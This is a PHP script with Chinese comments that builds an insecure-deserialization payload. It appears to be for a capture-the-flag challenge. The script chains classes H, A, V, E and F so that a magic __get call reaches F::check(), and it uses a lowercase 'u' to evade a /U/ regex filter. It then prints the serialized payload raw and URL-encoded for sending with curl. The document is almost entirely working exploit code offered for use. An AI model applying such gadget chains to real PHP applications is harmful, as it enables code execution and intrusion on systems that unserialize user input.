<?php
// 定义同名类，保证序列化后的可见性与属性名与目标环境一致
class A { public $first; public $step; public $next; function __construct(){ $this->first="继续加油！"; } }
class E { private $you; public $found; private $secret="admin123"; }
class F { public $fifth; public $step; public $finalstep; }
class H { public $who; public $are; public $you; function __construct(){ $this->you="nobody"; } }
class V { public $good; public $keep; public $dowhat; public $go; }

// 构造链：H -> A -> V -> (E -> F)
$h = new H();
$a = new A();
$v = new V();
$e = new E();
$f = new F();

$f->finalstep = 'u';      // 小写 u，绕过 F::check() 的 /U/ 检查
$e->found = $f;           // 让 E::__get('secret') 时调用 F::check()
$v->dowhat = 'secret';    // 触发访问 E 的私有属性 secret，从而触发 __get
$v->go = $e;
$a->next = $v;
$h->who = $a;

$payload = serialize($h);

// 输出原始与 URL 编码后的 payload，便于直接用在 curl 里
echo "RAW:\n".$payload."\n\n";
echo "URLENCODED:\n".urlencode($payload)."\n";